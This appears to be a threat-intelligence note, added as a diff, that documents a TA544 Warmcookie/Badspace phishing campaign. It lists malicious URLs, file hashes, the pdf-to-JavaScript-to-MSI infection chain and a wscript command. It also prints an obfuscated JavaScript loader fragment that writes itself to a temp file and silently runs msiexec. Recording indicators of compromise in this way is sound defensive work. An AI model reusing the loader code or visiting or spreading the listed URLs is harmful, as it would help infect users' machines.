@@ -1,0 +1,33 @@
+07.11.2024 | Warmcookie/Badspace | TA544 |
+
+*************************************************
+
+.url https://portals.checkfedexexp.com/documents?28f3c0c77f76899be4c6&medium=AUWRX&FXvk=326828c5ba7db1a8-8da5e6f8-aa891249-9a965b67-679dddc905f6c920738f2e&FA=67cd8d9486c68d6ea6dae8bcc72e43b81d07
+.pdf bf5946578933837cd7827cd657c00d80a7951cc223778c43ae96c709c304ff77
+.zip ab57c866e03cd462c01420332c138d20007959e7c3dc2e97b7ceac3bafabe7c5
+.js af4771a3e44783b16d1b3b920ef402bbcd76249913a23df4f491cc983237fd77
+.js 
+.msi 
+
+*************************************************
+
+pdf > url > .js > .js > .msi
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Invoice-749543952-006-5208511-2583153.js
+>
+
+*************************************************
+
+distro urls:
+
+https://financial.cupdatenewsthisinfo.com/sales?Yd=ae848059910732bdf4b5f362f8ad7fb0be63
+https://assistance.cupdatenewsthisinfo.com/assistance?Oyg=xpMUJ&KXq=UKiuahdvb&sourceRI=gROQPeoSn&iqcontent=ZAQAIV&MA_cid=5243030&CO=1972462
+
+e=h("scripting.filesystemobject");f=e.getspecialfolder(2)+"\\d"+ Math.floor(Math.random()*1000001);q=e.createtextfile(f);q.write(e.getfile(WScript.scriptfullname).openastextstream().read(1e7).slice(tt).replace(/Bob/g,'M').replace(/Fure/g,'n'));q.close();h("wscript.shell").run("msiex"+k+f+" /qn");'KXq
+
+*************************************************
+
+c2's
+
+
+*************************************************
